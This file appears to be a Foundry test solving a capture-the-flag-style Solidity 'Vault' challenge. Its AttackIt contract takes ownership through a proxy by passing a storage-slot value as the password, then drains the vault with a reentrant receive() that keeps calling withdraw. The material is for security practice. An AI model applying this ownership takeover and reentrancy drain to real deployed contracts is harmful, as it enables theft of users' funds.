// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        //
        //
        //
        // bytes memory data = abi.encodeCall(
        //     VaultLogic.changeOwner,
        //     (
        //         0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459, // bytes32("0x1234"),
        //         palyer
        //     )
        // );
        // (bool success, bytes memory result) = address(vault).call(data);

        console.log("passwordd not equal bytes32('0x1234'). why? it is:");
        console.logBytes32(
            0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459
        );

        console.log("\n\nmy balance:", palyer.balance);
        console.log("vault balance:", address(vault).balance);

        AttackIt attackIt = new AttackIt(address(vault));
        payable(address(attackIt)).transfer(0.05 ether);
        attackIt.attack();

        console.log("my balance2:", palyer.balance);
        console.log("vault balance2:", address(vault).balance);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

contract AttackIt {
    address vault;
    address owner;
    constructor(address _vault) {
        vault = _vault;
        owner = msg.sender;
    }
    function attack() external payable {
        VaultLogic(vault).changeOwner(
            // 这个为什么不是直接等于 bytes32("0x1234") ?
            0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459,
            address(this)
        );
        Vault(payable(vault)).openWithdraw();
        Vault(payable(vault)).deposite{value: 0.05 ether}();
        Vault(payable(vault)).withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }

    // receive() external payable {}

    receive() external payable {
        if (msg.sender == vault) {
            if (vault.balance >= 0.05 ether) {
                // emit WWWW(vault.balance);
                Vault(payable(vault)).withdraw();
            }
        }
    }
}
